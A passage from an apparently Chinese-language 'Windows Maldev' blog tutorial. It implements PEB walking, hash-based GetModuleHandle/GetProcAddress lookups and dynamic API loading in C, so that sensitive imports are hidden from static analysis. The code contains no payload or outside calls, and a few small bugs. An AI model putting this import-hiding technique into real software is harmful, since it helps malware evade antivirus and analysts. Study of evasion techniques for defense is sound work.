DEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_NUM 3</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showHash</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">char</span> dllName;</span><br><span class="line"><span class="type">char</span>* dllList[DLL_NUM] = &#123;</span><br><span class="line"><span class="string">&quot;NTDLL.DLL&quot;</span>,</span><br><span class="line"><span class="string">&quot;USER32.DLL&quot;</span>,</span><br><span class="line"><span class="string">&quot;KERNEL32.DLL&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; DLL_NUM; i++) &#123;</span><br><span class="line"><span class="type">char</span> temp;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;#define &quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; dllList[i][j] != <span class="string">&#x27;.&#x27;</span>; j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, dllList[i][j]);</span><br><span class="line"><span class="keyword">if</span> (j &lt; <span class="number">7</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\t0x%0.8X \n&quot;</span>, HASHA(dllList[i]));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">// DEBUG</span></span></span><br></pre></td></tr></table></figure><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025100804977.png" class=""><p>这样比较方便去定义，并且统一转换成大写。</p><p>接下来更新一下 <code>Yes_GetModuleHandle</code> 函数为 <code>Yes_GetModuleHandle_FromHash</code></p><p>这里大小写使用三元运算符实现，可以定义为一个宏</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_MAX_PATH256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TO_UPPER(C) C &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; C &lt;= <span class="string">&#x27;z&#x27;</span> ? C + <span class="string">&#x27;A&#x27;</span> - <span class="string">&#x27;a&#x27;</span> : C</span></span><br><span class="line">HMODULE <span class="title function_">GetModuleHandleH</span><span class="params">(IN UINT32 ui32DllHash)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64<span class="comment">// 获取 x64 peb</span></span></span><br><span class="line">PPEB            pPeb = (PEB*)(__readgsqword(<span class="number">0x60</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">elif</span> _WIN32<span class="comment">// 获取 x86 peb</span></span></span><br><span class="line">PPEB            pPeb = (PEB*)(__readfsdword(<span class="number">0x30</span>));</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb-&gt;Ldr);<span class="comment">// 获取 Ldr</span></span><br><span class="line">PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr-&gt;InMemoryOrderModuleList.Flink);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (pDte-&gt;FullDllName.Length != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">CHAR UpperCaseDllName[MAX_PATH] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; pDte-&gt;FullDllName.Length; i++)<span class="comment">// 转化成大写</span></span><br><span class="line">UpperCaseDllName[i] = (CHAR)TO_UPPER(pDte-&gt;FullDllName.Buffer[i]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ui32DllHash == HASHA(UpperCaseDllName))<span class="comment">// 判断 Hash 是否一致</span></span><br><span class="line"><span class="keyword">return</span> pDte-&gt;Reserved2[<span class="number">0</span>];<span class="comment">// 返回 DLL Base Address</span></span><br><span class="line"></span><br><span class="line">pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);<span class="comment">// 链表下一节点</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下效果，没啥问题。</p><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025103841263.png" class=""><blockquote><p>上文的代码中关于 <code>GetModuleHandle</code> 的实现使用了 <code>winternl.h</code> 头文件，这里可以使用 <a href="https://www.nirsoft.net/">NirSoft</a> 与 <a href="https://github.com/winsiderss/systeminformer/blob/master/phnt/include/ntpebteb.h">Process Hacker</a> 的结构体来代替。最终效果 仅需导入 <code>&lt;windows.h&gt;</code> 头文件。</p></blockquote><h2 id="实现-GetProcAddress"><a href="#实现-GetProcAddress" class="headerlink" title="实现 GetProcAddress"></a>实现 GetProcAddress</h2><p><code>GetProcAddress</code> 函数从 DLL 句柄中获取导出函数的地址。如果未找到函数名，返回 <code>NULL</code>。</p><h3 id="GetProcAddress-原理"><a href="#GetProcAddress-原理" class="headerlink" title="GetProcAddress 原理"></a>GetProcAddress 原理</h3><p>要访问导出的函数，需要访问 DLL 的导出表并在其中循环查找目标函数名称。</p><p>PE 头模块时提到，导出表是定义为 <code>IMAGE_EXPORT_DIRECTORY</code> 的结构。<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#export-directory-table">微软文档</a></p><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025110446188.png" class=""><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_EXPORT_DIRECTORY</span> &#123;</span></span><br><span class="line">    DWORD   Characteristics;</span><br><span class="line">    DWORD   TimeDateStamp;</span><br><span class="line">    WORD    MajorVersion;</span><br><span class="line">    WORD    MinorVersion;</span><br><span class="line">    DWORD   Name;</span><br><span class="line">    DWORD   Base;</span><br><span class="line">    DWORD   NumberOfFunctions;   <span class="comment">// 导出地址表中的条目数量</span></span><br><span class="line">    DWORD   NumberOfNames;</span><br><span class="line">DWORD AddressOfFunctions;    <span class="comment">// 函数地址（相对于镜像基地址的 RVA）</span></span><br><span class="line">DWORD AddressOfNames;        <span class="comment">// 名称地址（相对于镜像基地址的 RVA）</span></span><br><span class="line">DWORD AddressOfNameOrdinals; <span class="comment">// 名称序号地址（相对于镜像基地址的 RVA）</span></span><br><span class="line">&#125; IMAGE_EXPORT_DIRECTORY, *PIMAGE_EXPORT_DIRECTORY;</span><br></pre></td></tr></table></figure><p>需要关注的就是最后三个成员</p><ul><li><code>AddressOfFunctions</code> - 指定导出函数地址数组的地址。</li><li><code>AddressOfNames</code> - 指定导出函数名称地址数组的地址。</li><li><code>AddressOfNameOrdinals</code> - 指定导出函数的序号数组的地址。</li></ul><h3 id="简单实现-1"><a href="#简单实现-1" class="headerlink" title="简单实现"></a>简单实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">Yes_GetProcAddress</span><span class="params">(IN HMODULE hModule, IN LPCSTR lpApiName)</span> &#123;</span><br><span class="line">PBYTE pBase = (PBYTE)hModule;<span class="comment">// 转化一下</span></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;<span class="comment">// 获取 DOS 头</span></span><br><span class="line"><span class="keyword">if</span> (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)<span class="comment">// 签名检查</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);<span class="comment">// 获取 NT 头</span></span><br><span class="line"><span class="keyword">if</span> (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)<span class="comment">// 签名检查</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;<span class="comment">// 获取可选头</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<span class="comment">// 获取导出目录</span></span><br><span class="line"></span><br><span class="line">PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);<span class="comment">// 获取函数名称数组指针</span></span><br><span class="line">PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);<span class="comment">// 获取函数地址数组指针</span></span><br><span class="line">PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);<span class="comment">// 获取函数序号数组指针</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) &#123;</span><br><span class="line"></span><br><span class="line">CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);<span class="comment">// 获取函数的名称</span></span><br><span class="line">WORD wFunctionOrdinal = FunctionOrdinalArray[i];<span class="comment">// 获取函数的序号</span></span><br><span class="line">PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);<span class="comment">// 通过函数序数值获取函数地址</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[ No.%0.4d ] addr：0x%p Name：%s \n&quot;</span>, wFunctionOrdinal, pFunctionAddress, pFunctionName);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025122811847.png" class=""><p>效果还可以，与 GetModuleHandle 一样，可以加入 Hash 校验，来确定目标函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">Yes_GetProcAddress_FromHash</span><span class="params">(IN HMODULE hModule, IN UINT32 ui32FuncHash)</span> &#123;</span><br><span class="line">PBYTE pBase = (PBYTE)hModule;<span class="comment">// 转化一下</span></span><br><span class="line"></span><br><span class="line">PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;<span class="comment">// 获取 DOS 头</span></span><br><span class="line"><span class="keyword">if</span> (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)<span class="comment">// 签名检查</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-&gt;e_lfanew);<span class="comment">// 获取 NT 头</span></span><br><span class="line"><span class="keyword">if</span> (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)<span class="comment">// 签名检查</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-&gt;OptionalHeader;<span class="comment">// 获取可选头</span></span><br><span class="line">PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);<span class="comment">// 获取导出目录</span></span><br><span class="line"></span><br><span class="line">PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);<span class="comment">// 获取函数名称数组指针</span></span><br><span class="line">PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);<span class="comment">// 获取函数地址数组指针</span></span><br><span class="line">PWORD  FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);<span class="comment">// 获取函数序号数组指针</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (DWORD i = <span class="number">0</span>; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++)</span><br><span class="line"><span class="keyword">if</span> (HASHA(pBase + FunctionNameArray[i]) == ui32FuncHash)<span class="comment">// 比较函数名的 Hash</span></span><br><span class="line"><span class="keyword">return</span> (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);<span class="comment">// 通过函数序数值获取函数地址</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 Main 函数中调用检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> KERNEL32        0xD4D19933</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LoadLibraryA                    0x000000000FA9B202</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] WinApi: 0x%p - HashApi: 0x%p Func: %s&quot;</span>, GetProcAddress(Yes_GetModuleHandle_FromHash(KERNEL32), <span class="string">&quot;LoadLibraryA&quot;</span>), Yes_GetProcAddress_FromHash(Yes_GetModuleHandle_FromHash(KERNEL32), LoadLibraryA), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025131445933.png" class=""><h2 id="动态加载-Win-Api"><a href="#动态加载-Win-Api" class="headerlink" title="动态加载 Win Api"></a>动态加载 Win Api</h2><p>目前已经实现了 GetModuleHandle 和 GetProcAddress，可以动态加载函数了，在加载之前，需要声明函数类型，以便在获取函数地址后进行强制转换。</p><p>Demo 计划实现一个代替 printf 函数的宏实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTA( STR, ... )        \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (1) &#123;        \</span></span><br><span class="line"><span class="meta">        LPSTR buf = (LPSTR)pRtlAllocateHeap(pGetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );\</span></span><br><span class="line"><span class="meta">        <span class="keyword">if</span> ( buf != NULL ) &#123;        \</span></span><br><span class="line"><span class="meta">            int len = pwsprintfA( buf, STR, __VA_ARGS__ );        \</span></span><br><span class="line"><span class="meta">            pWriteConsoleA( pGetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );        \</span></span><br><span class="line"><span class="meta">            pHeapFree( pGetProcessHeap(), 0, buf );        \</span></span><br><span class="line"><span class="meta">        &#125;        \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br></pre></td></tr></table></figure><p>其中用到了以下函数</p><ul><li>wsprintfA (user32.dll)</li><li>HeapFree (kernel32.dll)</li><li>RtlAllocateHeap (ntdll.dll)</li><li>GetStdHandle (kernel32.dll)</li><li>GetProcessHeap (kernel32.dll)</li><li>WriteConsoleA (kernel32.dll)</li></ul><p>另外还会用到 LoadLibraryA (kernel32.dll)，在某些情况进程中没有 user32.dll 时来加载它。</p><h3 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h3><p>按照声明格式写好模板</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="title function_">HMODULE</span><span class="params">(WINAPI* fnLoadLibraryA)</span><span class="params">(LPCSTR lpLibFileName)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* fnHeapFree)</span><span class="params">(HANDLE hHeap, DWORD dwFlags, _Frees_ptr_opt_ LPVOID lpMem)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI* fnRtlAllocateHeap)</span><span class="params">(PVOID HeapHandle, ULONG Flags, SIZE_T Size)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* fnGetProcessHeap)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* fnGetStdHandle)</span><span class="params">(DWORD nStdHandle)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* fnWriteConsoleA)</span><span class="params">(HANDLE  hConsoleOutput, <span class="type">const</span> VOID* lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID  lpReserved)</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* fnGetProcessHeap)</span><span class="params">()</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">int</span><span class="params">(WINAPIV* fnwsprintfA)</span><span class="params">(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...)</span>;</span><br></pre></td></tr></table></figure><p>准备好 Hash</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// DLL Name Hash</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_NTDLL              0x4898F593</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_USER32             0x81E3778E</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HASH_KERNEL32           0x367DC15A</span></span><br><span class="line"><span class="comment">// WIN API Name Hash</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_LoadLibraryA       0x19F0EEAF</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_wsprintfA          0x2AF0CBF4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_HeapFree           0x1154459B</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_HeapAlloc          0x2F9B708A</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_RtlAllocateHeap    0xF5613878</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_GetStdHandle       0x0C685B0E</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_WriteConsoleA      0x65304EA1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> Hash_GetProcessHeap     0x3BCCFAC6</span></span><br></pre></td></tr></table></figure><p>创建全局函数指针变量，用 api_init 函数初始化所有函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">fnLoadLibraryA pLoadLibraryA;</span><br><span class="line">fnHeapFree pHeapFree;</span><br><span class="line">fnHeapAlloc pHeapAlloc;</span><br><span class="line">fnGetStdHandle pGetStdHandle;</span><br><span class="line">fnWriteConsoleA pWriteConsoleA;</span><br><span class="line">fnGetProcessHeap pGetProcessHeap;</span><br><span class="line">fnwsprintfA pwsprintfA;</span><br><span class="line">fnRtlAllocateHeap pRtlAllocateHeap;</span><br><span class="line"><span class="type">void</span> <span class="title function_">api_init</span><span class="params">()</span> &#123;</span><br><span class="line">HMODULE hModule_Kernel32 = Yes_GetModuleHandle_FromHash(HASH_KERNEL32);</span><br><span class="line"><span class="keyword">if</span> (hModule_Kernel32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] K32_DLL Get Fail. \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">pLoadLibraryA = (fnLoadLibraryA)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_LoadLibraryA);</span><br><span class="line">pHeapFree = (fnHeapFree)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_HeapFree);</span><br><span class="line">pHeapAlloc = (fnHeapAlloc)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_HeapAlloc);</span><br><span class="line">pGetStdHandle = (fnGetStdHandle)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_GetStdHandle);</span><br><span class="line">pWriteConsoleA = (fnWriteConsoleA)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_WriteConsoleA);</span><br><span class="line">pGetProcessHeap = (fnGetProcessHeap)Yes_GetProcAddress_FromHash(hModule_Kernel32, Hash_GetProcessHeap);</span><br><span class="line"></span><br><span class="line">HMODULE hModule_User32 = Yes_GetModuleHandle_FromHash(HASH_USER32);</span><br><span class="line"><span class="keyword">if</span> (hModule_User32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] U32_DLL Get Fail.\n[+] Try Load U32_DLL.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> User32_dll[] = &#123; <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span> &#125;;</span><br><span class="line">hModule_User32 = pLoadLibraryA(User32_dll);</span><br><span class="line"><span class="keyword">if</span> (hModule_User32 == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] U32_DLL Load Fail. \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pwsprintfA = (fnwsprintfA)Yes_GetProcAddress_FromHash(hModule_User32, Hash_wsprintfA);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HMODULE hModule_NtDll = Yes_GetModuleHandle_FromHash(HASH_NTDLL);</span><br><span class="line"><span class="keyword">if</span> (hModule_NtDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] U32_DLL Get Fail.\n[+] Try Load U32_DLL.\n&quot;</span>);</span><br><span class="line"><span class="type">char</span> NtDll_dll[] = &#123; <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;\x00&#x27;</span> &#125;;</span><br><span class="line">hModule_NtDll = pLoadLibraryA(NtDll_dll);</span><br><span class="line"><span class="keyword">if</span> (hModule_NtDll == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] U32_DLL Load Fail. \n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">pRtlAllocateHeap = (fnwsprintfA)Yes_GetProcAddress_FromHash(hModule_NtDll, Hash_RtlAllocateHeap);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就完成了预期需求。</p><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p><strong>main.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">api_init();</span><br><span class="line">PRINTA(<span class="string">&quot;[+] pLLA Func Addr: 0x%p \n&quot;</span>, pLoadLibraryA);</span><br><span class="line">PRINTA(<span class="string">&quot;[+] pRAH Func Addr: 0x%p \n&quot;</span>, pRtlAllocateHeap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main 函数调用 api_init 对自定义 API 进行初始化，然后使用 PRINTA 宏打印信息。</p><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025163259037.png" class=""><p>整个项目仅需包含 <code>Windows.h</code> 头文件，来到 Pe-Bear 可以看到，Kernel32.dll 的导入表中的敏感函数导入信息已经去掉，同样加载的 User32.dll 和 NTDLL.dll 也没有显示。</p><img src="/2024/10/23/Windows%20Maldev%20-%20ITA%20%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B7%B7%E6%B7%86/image-20241025163633851.png" class=""><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p><strong>api.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span 